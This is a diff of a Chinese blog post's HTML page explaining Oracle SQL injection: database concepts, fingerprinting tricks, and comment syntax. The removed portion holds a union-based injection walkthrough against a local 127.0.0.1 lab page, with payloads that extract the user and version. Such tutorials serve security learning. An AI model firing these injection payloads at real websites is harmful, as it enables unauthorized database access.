@@ -6,18 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>我的小blog</title>
+  <title>oracle注入 | 我的小blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="oracle注入： oracle的实例：Oracle数据库的基本单位，等同于Mysql中的库 当前数据库下有N张表  &lt;&#x3D;&gt; Oracle：当前用户下有N张表  DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。 RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。 CONNECT:拥有Connect权限的用户只可以登录Oracl">
-<meta property="og:type" content="website">
-<meta property="og:title" content="我的小blog">
-<meta property="og:url" content="http://example.com/assets/imgs/oracle%E6%B3%A8%E5%85%A5.html">
+  <meta name="description" content="oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库 数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。数据库名和实例名可以相同也可以不同。在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构">
+<meta property="og:type" content="article">
+<meta property="og:title" content="oracle注入">
+<meta property="og:url" content="http://example.com/2021/06/23/oracle/index.html">
 <meta property="og:site_name" content="我的小blog">
-<meta property="og:description" content="oracle注入： oracle的实例：Oracle数据库的基本单位，等同于Mysql中的库 当前数据库下有N张表  &lt;&#x3D;&gt; Oracle：当前用户下有N张表  DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。 RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。 CONNECT:拥有Connect权限的用户只可以登录Oracl">
+<meta property="og:description" content="oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库 数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。数据库名和实例名可以相同也可以不同。在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-06-23T12:45:27.221Z">
-<meta property="article:modified_time" content="2021-04-28T02:06:13.555Z">
+<meta property="article:published_time" content="2021-06-23T12:15:19.000Z">
+<meta property="article:modified_time" content="2021-06-23T13:13:38.186Z">
 <meta property="article:author" content="Gun97Dt">
+<meta property="article:tag" content="sql注入 web安全 技术">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="我的小blog" type="application/atom+xml">
@@ -136,35 +137,50 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-oracle" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      oracle注入
+    </h1>
+  
+
+        
+        <a href="/2021/06/23/oracle/" class="archive-article-date">
+  	<time datetime="2021-06-23T12:15:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-23</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>oracle注入：</p>
-<p>oracle的实例：Oracle数据库的基本单位，等同于Mysql中的库</p>
+        <p>oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库</p>
+<p>数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。<br>数据库名和实例名可以相同也可以不同。<br>在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。</p>
+<p>数据库实例名与ORACLE_SID<br>虽 然两者都表是oracle实例，但两者是有区别的。instance_name是oracle数据库参数。而ORACLE_SID是操作系统的环境变量。 ORACLD_SID用于与操作系统交互，也就是说，从操作系统的角度访问实例名，必须通过ORACLE_SID。在winnt平 台，ORACLE_SID还需存在于注册表中。<br>且ORACLE_SID必须与instance_name的值一致，否则，你将会收到一个错误，在unix平台，是“ORACLE not available”,在winnt平台，是“TNS:协议适配器错误”。</p>
 <p>当前数据库下有N张表  &lt;=&gt; Oracle：当前用户下有N张表</p>
-<ul>
+<ol>
 <li>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。</li>
 <li>RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。</li>
 <li>CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构</li>
-<li>一般oracle数据库安装成功后会创建几个默认用户<code>sys</code>、<code>system</code>、<code>public</code>等</li>
-</ul>
-<p>oracle特性：</p>
+<li>一般oracle数据库安装成功后会创建几个默认用户’sys’、’system’、’public’等。</li>
+</ol>
+<h2 id="oracle特性"><a href="#oracle特性" class="headerlink" title="oracle特性"></a>oracle特性</h2><p>Oracle 数据库的注入不同于其他数据库，如Access 和Mysql，它包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名，</p>
+<p>如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名</p>
 <p>   Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录</p>
 <p>oracle 支持– 类型注释，但是不支持;分隔执行多语句，oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle，另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些，语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。</p>
-<h6 id="oracle注入中需要注意的一些小点"><a href="#oracle注入中需要注意的一些小点" class="headerlink" title="oracle注入中需要注意的一些小点:"></a>oracle注入中需要注意的一些小点:</h6><h6 id=""><a href="#" class="headerlink" title=""></a></h6><ul>
-<li><p>Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。</p>
-</li>
-<li><p>Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”)</p>
-<p>例如: <code>SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0</code></p>
-<p><strong>Oracle的单行注释符号是–，多行注释符号/</strong>/。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure>
-<h1 id="支持的注释符"><a href="#支持的注释符" class="headerlink" title="支持的注释符"></a>支持的注释符</h1><p>–</p>
-</li>
-</ul>
-<hr>
-<p>  –空格<br>/**/<br>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  **判断Oracle数据库：**</span><br><span class="line"></span><br><span class="line">  <span class="number">1.</span>oracle 支持– 类型注释，但是不支持;分隔执行多语句；oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle；另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些；语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(<span class="number">123</span>)||chr(<span class="number">123</span>)=chr(<span class="number">123</span>)||chr(<span class="number">123</span>)这样的，如果可以顺利执行，那么就基本应该是oracle 了。</span><br><span class="line"></span><br><span class="line">  利用函数来判断是否oracle数据库 如：<span class="keyword">and</span> len(<span class="string">&#x27;a&#x27;</span>)=<span class="number">1</span>（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。）</span><br><span class="line"></span><br><span class="line">  也可以通过dual来判断是否为oracle ：</span><br><span class="line">  </span><br><span class="line">  **<span class="keyword">select</span> count(*) <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> count(*) <span class="keyword">from</span> dual)&gt;<span class="number">1</span> <span class="comment">--**</span></span><br><span class="line">  </span><br><span class="line">  ![image<span class="number">-20210426172344519</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210426172344519.</span>png)</span><br><span class="line">  </span><br><span class="line">  **<span class="keyword">select</span> count(*) <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> count(*) <span class="keyword">from</span> dual)&gt;<span class="number">0</span> <span class="comment">--**</span></span><br><span class="line">  </span><br><span class="line">  ![image<span class="number">-20210426172401354</span>](./oracle/image<span class="number">-20210426172401354.</span>png)</span><br><span class="line"></span><br><span class="line">**http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/oracle.php?id=<span class="number">1</span><span class="string">&#x27; and (select count (*) from user_tables)&gt;0--**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210426172624271](D:\work\oracle\image-20210426172624271.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**也可以利用：单引号双=正确，单引号单位数=错误  的规则。**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**联合注入步骤**：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210426173217803](D:\work\oracle\image-20210426173217803.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断闭合，和mysql一样，此处判断为单引号闭合：http://127.0.0.1/oracle.php?id=1&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">![image<span class="number">-20210426173202544</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210426173202544.</span>png)</span><br><span class="line"></span><br><span class="line">判断字段数：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/oracle.php?id=<span class="number">1</span><span class="string">&#x27; order by 4 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210426173315079](D:\work\oracle\image-20210426173315079.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断联合注入：http://127.0.0.1/oracle.php?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">![image<span class="number">-20210426173439832</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210426173439832.</span>png)</span><br><span class="line"></span><br><span class="line">判断每个字段的数据类型：</span><br><span class="line"></span><br><span class="line">第<span class="number">1</span>个字段为数字型：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/oracle.php?id=<span class="number">-1</span><span class="string">&#x27; union select 1,null,null,null from dual--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210426173644888](D:\work\oracle\image-20210426173644888.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">继续判断第2个字段的数据类型：http://127.0.0.1/oracle.php?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">![image<span class="number">-20210426173722211</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210426173722211.</span>png)</span><br><span class="line"></span><br><span class="line">结合上图可以判断出第<span class="number">2</span>个字段为字符串类型：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/oracle.php?id=<span class="number">-1</span><span class="string">&#x27; union select 1,&#x27;</span><span class="number">2</span><span class="string">&#x27;,null,null from dual--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210426173823520](D:\work\oracle\image-20210426173823520.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后就可以以此类推来判断后面每个字段的数据类型了，这里就不再重复了。。最终判断的结果为：http://127.0.0.1/oracle.php?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">![image<span class="number">-20210426174000425</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210426174000425.</span>png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">判断当前数据库的用户：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/oracle.php?id=<span class="number">-1</span><span class="string">&#x27; union select 1,(select sys_context(&#x27;</span>userenv<span class="string">&#x27;,&#x27;</span><span class="built_in">current_user</span><span class="string">&#x27;) from dual),null,null from dual--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210427100035497](D:\work\oracle\image-20210427100035497.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/oracle.php?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">![image<span class="number">-20210427101453578</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210427101453578.</span>png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取当前数据库的版本：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/oracle.php?id=<span class="number">-1</span><span class="string">&#x27; union select 1,(select banner from sys.v_$version where rownum=1),null,null from dual--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210427100447931](D:\work\oracle\image-20210427100447931.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/oracle.php?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> v$<span class="keyword">version</span> <span class="keyword">where</span> banner <span class="keyword">like</span> <span class="string">&#x27;Oracle%&#x27;</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">![image<span class="number">-20210427101049282</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210427101049282.</span>png)</span><br><span class="line"></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/oracle.php?id=<span class="number">-1</span><span class="string">&#x27; union select 1,(select version from v$instance),null,null from dual--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![image-20210427101139858](D:\work\oracle\image-20210427101139858.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取操作系统版本：http://127.0.0.1/oracle.php?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> v$<span class="keyword">version</span> <span class="keyword">where</span> banner <span class="keyword">like</span> <span class="string">&#x27;TNS%&#x27;</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"> ![image<span class="number">-20210427101347658</span>](D:\<span class="keyword">work</span>\oracle\image<span class="number">-20210427101347658.</span>png)</span><br><span class="line"></span><br><span class="line">爆破数据库名</span><br></pre></td></tr></table></figure></p>
+<h3 id="oracle注入中需要注意的一些点"><a href="#oracle注入中需要注意的一些点" class="headerlink" title="oracle注入中需要注意的一些点"></a>oracle注入中需要注意的一些点</h3><ol>
+<li>Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。</li>
+<li>Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”)：<br>例如: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>Oracle的单行注释符号是–，多行注释符号/**/。</p>
+<h4 id="支持的注释符"><a href="#支持的注释符" class="headerlink" title="支持的注释符"></a>支持的注释符</h4><p>–<br>–空格<br>/**/</p>
+<h2 id="判断Oracle数据库"><a href="#判断Oracle数据库" class="headerlink" title="判断Oracle数据库"></a>判断Oracle数据库</h2><p>1.oracle 支持– 类型注释，但是不支持;分隔执行多语句；oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle；另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些；语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。</p>
+<p>利用函数来判断是否oracle数据库 如：and len(‘a’)=1（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。）</p>
+<p>也可以通过dual来判断是否为oracle ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(\*) from dual)&gt;1 --</span><br></pre></td></tr></table></figure>
 
       
 
@@ -194,6 +210,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">sql注入 web安全 技术</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -244,7 +271,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/assets/imgs/oracle%E6%B3%A8%E5%85%A5.html" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/06/23/oracle/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -256,6 +283,16 @@
 </article>
 
   
+<nav id="article-nav">
+  
+  
+    <a href="/2021/06/23/20210623%E6%97%A5%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">日记-20210623</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -306,7 +343,7 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
